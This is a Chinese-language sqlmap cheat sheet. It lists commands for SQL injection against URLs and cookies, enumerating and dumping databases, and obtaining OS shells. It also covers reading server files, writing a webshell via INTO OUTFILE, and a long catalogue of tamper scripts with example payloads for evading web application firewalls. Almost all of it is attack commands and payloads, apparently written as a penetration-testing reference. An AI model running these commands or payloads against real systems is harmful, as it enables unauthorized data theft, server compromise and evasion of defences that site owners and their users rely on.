# Sqlmap

---

所有请求方式都能注入，默认是get/post,但是当使用--level参数>=2时，检查cookies，>=3时检查user-agent和referer、 --level 1 GET|2 cookies|3 POST

提示输入的选择，大写是回车默认选项

出现红色提示就是错误，建议加参数

版本：

```
python 版本，较简便，基础功能都有(https://github.com/sqlmapproject/sqlmap)

kali版本，较全面，可以msf联动
```

---

## 常用：

```
python sqlmap.py -u http://www.xxx.com/id=1 -p Id --random-agent --dbms mysql -proxy=http://127.0.0.1:10809 --threads=5 --dbs
```



---

sqlmap -u "http://URL/id=1"	

## 参数

```

--current-db 		#列出当前的数据库
 
--current-user		#列出当前的权限用户

--threads=线程数    #设置线程数，0~10

--delay 1           #延时1秒

--time-sec          #

--referer IP或域名  #设置访问来源

--is-dba  #查看当前数据库用户权限

--level 等级  （等级越高检测会越全面，总5级）

--dbms 数据库名 （指定数据库类型）

--batch   按照sqlmap的默认提示往下确认

--proxy http://localhost:8080 #代理

--random-agent

-p 参数名  #指定注入点参数，当有多个参数时使用 ,默认全部参数都测试注入

-r 文件名         #该文件是能注入的页面的抓·包

--charset=     #编码格式GBK、UTF-8

--dbs 			#列出服务器中所有的数据库

-D 库名 --tables 	#列出该库的所有表

-D 库名 -T 表名 --columns #列出库名的表名的所有字段名

-D 库名 -T 表名 -C "字段名" --dump #列出库名的表名的字段名的数据

-vv 显示详细操作如：使用的payload等

--identify-waf  #探测waf

--os-shell

--prefix=PREFIX  # 加payload前面闭合符号

--suffix=SUFFIX  # 加payload后面闭合符号

4.0版本可以用

--os-pwn #获取操作系统的shell  ，需要依赖msf（建议在kali里使用）

--sql-query='sql语句'

--sql-shell               
# 文件读取
1.
select load_file('绝对路径') #查看后台登录页面判断登录的代码，找到用户名和密码的代入查询的字段名，和表名（注意，路径使用/，无论是windows还是linux，如要使用\ 就使用\\或者16进制,16进制就不用双引号）windows2003读取C:/windows/system32/inetarv/metabase.xml就可以查看到所有网站根目录
2.
select load data infile '绝对路径' into table user1;  #读取文件写入到user1表中
select * from user;  
select '一句话'INTO OUTFILE '/home/wwwroot/xxx’
需要和phpinfo配合，获取web绝对路径
--sql-query='sql语句'
3.mysql 5.x以上，sql连接是本地才可以执行
system cat 绝对路径 ;  #执行系统命令读取

```
当无法读取数据库表名

```
情况：
1.版本小于5.0的MySQL没有information_schema表
2.微软Access的MSysObjects表默认不可读
3.数据库用户权限过低无法读取表名

--common-tables  #爆破表名，爆破字典路径txt/common-tables.txt
--common-columns #爆破列名，爆破字典路径txt/common-columns.txt
```



指定注入类型：

```
--technique B
B : 基于Boolean的盲注（Boolean based blind）
Q : 内联查询（Inline queries）
T : 基于时间的盲注（time based blind）
U : 基于联合查询（Union query based）
E : 基于错误（error based）
S : 栈查询（stack queries）
```

---

## cookies注入：（等级2才有cookies注入检测）

sqlmap -u "URL/xxx.php" --cookie "id=n" --level 2 --dbms=mysql --dbs   #cookies注入mysql数据库，查看所有数据库

--cookie "id=n"  --level 2 -D 库名 --tables

--cookie "id=n"  --level 2 -D 库名 -T 表名 --columns

--cookie "id=n"  --level 2 -D 库名 -T 表名 -C "字段名" --dump

\-----------------------------

## temper

tamper（编写绕过规则）：进行绕过waf（防护规则，检测发包间隔）

sqlmap -u "http://URL/id=1" --tamper "xx.py"  

详细：默认tamper

```
http://www.91ri.org/7852.html
https://blog.csdn.net/admin18310911366/article/details/114061907
```

bypass waf

```
https://github.com/pureqh/bypasswaf
```



例子：

- 详细：
- https://www.cnblogs.com/lgf01010/p/9550725.html
- https://blog.csdn.net/whatday/article/details/54774043

```
--tamper=xxx    # 多个使用--tamper "xxx1,xxx2"
常用：
所有数据库：
apostrophemask.py  # 用utf8代替引号，("1 AND '1'='1")替换后'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
base64encode.py    # 用base64编码替换，("1' AND SLEEP(5)#")替换后'MScgQU5EIFNMRUVQKDUpIw=='
multiplespaces.py  #围绕SQL关键字添加多个空格，1 UNIONSELECTfoobar')替换后'1UNIONSELECTfoobar'
space2plus.py      # 用+替换空格，('SELECTidFROMusers')替换后'SELECT+id+FROM+users'
nonrecursivereplacement.py  # 双重查询语句，('1 UNION SELECT 2--')替换后'1 UNIOUNIONN SELESELECTCT 2--'
space2randomblank.py # 代替空格字符（“”）从一个随机的空白字符可选字符的有效集,('SELECTidFROMusers')替换后'SELECT%0Did%0DFROM%0Ausers'
unionalltounion.py# 替换UNION ALL SELECT UNION SELECT,('-1 UNION ALLSELECT')替换后'-1UNIONSELECT'
securesphere.py   # 追加特制的字符串,('1 AND 1=1')替换后"1 AND 1=1 and '0having'='0having'"

mysql:
equaltolike.py# like 代替等号，SELECT*FROMusersWHEREid=1替换后SELECT*FROMusersWHEREidLIKE1
greatest.py# 绕过过滤’>’ ,用GREATEST替换大于号。，('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
apostrophenullencode.py# 绕过过滤双引号，替换字符和双引号，("1 AND '1'='1")替换后'1 AND %00%271%00%27=%00%271'
ifnull2ifisnull.py# 绕过对 IFNULL 过滤，('IFNULL(1, 2)')替换后'IF(ISNULL(1),2,1)'
space2mssqlhash.py# 替换空格，('1 AND 9227=9227')替换后'1%23%0AAND%23%0A9227=9227'
modsecurityversioned.py# 过滤空格，包含完整的查询版本注释，('1 AND 2>1--')替换后'1 /*!30874AND 2>1*/--'
space2mysqlblank.py# 空格替换其它空白符号(mysql)，SELECTidFROMusers替换后SELECT%0Bid%0BFROM%A0users
between.py# 用between替换大于号（>），('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
modsecurityzeroversioned.py# 包含了完整的查询与零版本注释，('1 AND 2>1--')替换后'1 /*!00000AND 2>1*/--'
space2mysqldash.py# 替换空格字符（' '）（' – '）后跟一个破折号注释一个新行（' n'），('1 AND 9227=9227')替换后'1--%0AAND--%0A9227=9227'
bluecoat.py# 代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like，
percentage.py# asp允许每个字符前面添加一个%号
charencode.p# url编码，
randomcase.p# 随机大小写，INSERT替换后 InsERt
versionedkeywords.p# 注释绕过，/*!xxx*/ 
space2comment.p# 将空格替换为/**/，SELECT id FROM users替换后 SELECT/**/id/**/FROM/**/users
charunicodeencode.p# 字符串 unicode 编码
versionedmorekeywords.p# 注释绕过/*!xxx**!xx*/和/*!xxx*/，mysql小于5.1
halfversionedmorekeywords.p# 当数据库为mysql时绕过防火墙，每个关键字之前添加/*!


mssql：
space2hash.py         # 绕过过滤=, 替换空格字符，后跟一个破折号注释，一个随机字符串和一个新行
equaltolike.py        # like代替等号,SELECT*FROMusersWHEREid=1替换后SELECT*FROMusersWHEREidLIKE1
space2mssqlblank.py   # 空格替换为其它空符号,SELECTidFROMusers替换后SELECT%08id%02FROM%0Fusers
space2mssqlhash.py    # 替换空格,('1 AND 9227=9227')替换后'1%23%0AAND%23%0A9227=9227'
between.py            # 将>字符替换为NOT BETWEEN 0 AND；将=字符替换为BETWEEN # AND # 
percentage.py         # asp允许每个字符前面添加一个%号,SELECT * FROM TABLE替换后%S%E%L%E%C%T * %F%R%O%M %T%A%B%L%E
sp_password.py        # 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
randomcase.py         # 随机大小写
charencode.py         # 全部转成url编码
charunicodeencode.py  # 全部转成unicode编码,必要条件:ASP,ASP.NET
space2comment.py      # 将空格替换成/**/

oracle：
greatest.py # 绕过过滤’>’ ,用GREATEST替换大于号，('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
apostrophenullencode.py #  绕过过滤双引号，双引号替换成字符（%00%27）或者单引号。
between.py # 用between替换大于号（>），('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
charencode.py # url编码
randomcase.py # 随机大小写
charunicodeencode.py # 字符串 unicode 编码
space2comment.py # 将空格替换成/**/

PostgreSQL：
greatest.py # 绕过过滤’>’ ,用GREATEST替换大于号。
apostrophenullencode.py # 绕过过滤双引号，双引号替换成字符（%00%27）或者单引号。
between.py # 用between替换大于号（>）
('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
percentage.py # asp允许每个字符前面添加一个%号
charencode.py # url编码
randomcase.py # 随机大小写
charunicodeencode.py # 字符串 unicode 编码
space2comment.py # 将空格替换成/**/

Microsoft Access数据库：
appendnullbyte.py # 在有效负荷结束位置加载零字节字符编码，('1 AND 1=1')替换后'1 AND 1=1%00'

其他数据库：
chardoubleencode.py  # 双url编码(不处理已编码的)
unmagicquotes.py  # 宽字符绕过 GPC  addslashes，1′ AND 1=1替换后1%bf%27 AND 1=1--
randomcomments.py # 用/**/分割sql关键字，'INSERT'替换后'IN/**/S/**/ERT’
```

